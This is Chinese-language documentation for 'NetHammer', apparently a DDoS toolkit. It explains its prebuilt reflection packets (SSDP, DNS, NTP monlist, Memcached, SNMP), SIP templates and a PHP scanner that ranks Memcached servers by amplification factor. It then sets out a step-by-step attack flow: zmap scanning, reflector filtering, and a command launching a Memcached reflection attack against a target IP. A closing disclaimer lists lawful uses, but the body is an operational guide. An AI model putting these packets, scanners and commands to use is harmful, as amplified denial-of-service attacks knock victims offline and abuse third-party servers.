# NetHammer 文件类型详解

## 📦 **PKT文件 (Packet Files)**

### 🎯 **作用**
PKT文件是**预构造的网络数据包**，用于各种协议的扫描和攻击。

### 📋 **文件列表和用途**

| 文件名 | 协议 | 端口 | 用途 |
|--------|------|------|------|
| `upnp_1900.pkt` | SSDP/UPnP | 1900 | UPnP设备发现和反射攻击 |
| `dns_53.pkt` | DNS | 53 | DNS查询包，用于DNS反射攻击 |
| `ntp_123.pkt` | NTP | 123 | NTP时间查询包 |
| `ntp_123_monlist.pkt` | NTP | 123 | NTP monlist查询(高放大倍数) |
| `memcache_11211.pkt` | Memcached | 11211 | Memcached统计查询 |
| `snmp1_161.pkt` | SNMP v1 | 161 | SNMP v1查询包 |
| `snmp2_161.pkt` | SNMP v2 | 161 | SNMP v2查询包 |

### 🔍 **PKT文件内容示例**

#### **UPnP SSDP包 (upnp_1900.pkt)**
```http
M-SEARCH * HTTP/1.1
Host:239.255.255.250:1900
ST:upnp:rootdevice
Man:"ssdp:discover"
MX:3
```
**用途**: 发送UPnP设备发现请求，触发设备响应，用于SSDP反射攻击

#### **DNS查询包 (dns_53.pkt)**
```
二进制数据包，包含:
- DNS头部 (12字节)
- 查询域名 (如 VERSION.BIND)
- 查询类型 (TXT记录)
```
**用途**: 查询DNS服务器版本信息，用于DNS反射攻击

---

## 📝 **TPL文件 (Template Files)**

### 🎯 **作用**
TPL文件是**数据包模板**，包含变量占位符，在运行时动态替换。

### 📋 **文件示例**

#### **SIP OPTIONS模板 (sip_options.tpl)**
```sip
OPTIONS sip:${RAND_ALPHA=8}@${DADDR} SIP/2.0
Via: SIP/2.0/UDP ${SADDR}:${SPORT};branch=${RAND_ALPHA=6}.${RAND_DIGIT=10}
From: sip:${RAND_ALPHA=8}@${SADDR}:${SPORT};tag=${RAND_DIGIT=8}
To: sip:${RAND_ALPHA=8}@${DADDR}
Call-ID: ${RAND_DIGIT=10}@${SADDR}
CSeq: 1 OPTIONS
Contact: sip:${RAND_ALPHA=8}@${SADDR}:${SPORT}
Content-Length: 0
Max-Forwards: 20
User-Agent: ${RAND_ALPHA=8}
Accept: text/plain
```

### 🔧 **变量说明**
- `${DADDR}` - 目标IP地址
- `${SADDR}` - 源IP地址  
- `${SPORT}` - 源端口
- `${RAND_ALPHA=8}` - 8位随机字母
- `${RAND_DIGIT=10}` - 10位随机数字

**用途**: 生成SIP OPTIONS请求，用于SIP服务器扫描和攻击

---

## 🐘 **PHP文件 (Memcached扫描器)**

### 🎯 **作用**
PHP脚本用于**Memcached服务器的扫描和测试**，寻找可用于反射攻击的服务器。

### 📋 **文件结构**

```
memcached_scan_filter/
├── config.php              # 配置文件
├── MemcacheChecker.php      # 主检查器
├── MemcacheStatusRespondChecker.php  # 状态响应检查
├── libmemc.php             # Memcached库函数
├── libtest.php             # 测试库函数
├── thread.php              # 多线程处理
└── setup.php               # 安装设置
```

### 🔍 **主要功能**

#### **1. MemcacheChecker.php**
```php
function thread($ip, $output, $responselength) {
    // 测试Memcached服务器响应
    $len = MemcachedTester($ip, TEST_TIMEOUT);
    if ($len >= $responselength) {
        addentry($output, $ip);
        print($ip . " " . $len . " [x" . round($len / QUERY_LENGTH, 2) . "]\n");
    }
}
```
**功能**: 
- 测试IP是否运行Memcached服务
- 计算放大倍数 (响应长度/查询长度)
- 筛选出高放大倍数的服务器

#### **2. config.php**
```php
define("TEST_TIMEOUT", 2);      // 测试超时时间
define("QUERY_LENGTH", 100);    // 查询包长度
define("STAT_QUERY_LENGTH", 20); // 统计查询长度
```
**功能**: 设置扫描参数和超时时间

### 🚀 **使用流程**

1. **扫描阶段**:
   ```bash
   php MemcacheChecker.php IP段 输出文件 最小响应长度
   ```

2. **过滤阶段**:
   - 测试每个IP的Memcached响应
   - 计算放大倍数
   - 保存高放大倍数的IP到文件

3. **攻击阶段**:
   - 使用筛选出的IP进行Memcached反射攻击
   - 发送小查询包，获得大响应包

---

## 🛠️ **其他重要文件**

### **C源码文件**
```
source_get/memcached.c       # Memcached GET命令工具
source_stats/memcached.c     # Memcached STATS命令工具
```
**用途**: 编译成二进制工具，用于Memcached服务器交互

### **数据包文件**
```
memcache_11211.pkt          # Memcached查询包
```
**用途**: 预构造的Memcached STATS查询包

---

## 🎯 **实际攻击流程**

### **1. 扫描阶段**
```bash
# 使用PHP脚本扫描Memcached服务器
php MemcacheChecker.php 1.1.1.0/24 memcache_list.txt 1000

# 使用PKT文件扫描其他协议
zmap -p 1900 -M udp -P 1000 --probe-module=udp --probe-args=file:upnp_1900.pkt
```

### **2. 过滤阶段**
```bash
# PHP脚本自动过滤高放大倍数服务器
# 输出格式: IP 响应长度 [放大倍数]
# 例: 1.2.3.4 50000 [x500.0]
```

### **3. 攻击阶段**
```bash
# 使用筛选出的反射器进行攻击
./attack_tools/memcached 目标IP 目标端口 memcache_list.txt 线程数 持续时间
```

---

## ⚠️ **安全提醒**

### **合法用途**
- ✅ 内网安全测试
- ✅ 授权渗透测试  
- ✅ 安全研究和学习

### **禁止用途**
- ❌ 未授权网络扫描
- ❌ 恶意DDoS攻击
- ❌ 破坏网络服务

### **技术风险**
- 🔍 **可追踪性**: 扫描活动可能被记录
- 🚫 **法律风险**: 未授权使用属于违法行为
- 🛡️ **防护措施**: 现代防火墙可检测此类攻击

---

**总结**: PKT/TPL文件和PHP脚本是NetHammer的核心组件，用于构造攻击数据包和扫描反射服务器。它们大大提高了攻击的自动化程度和效果，但必须在合法授权的范围内使用。
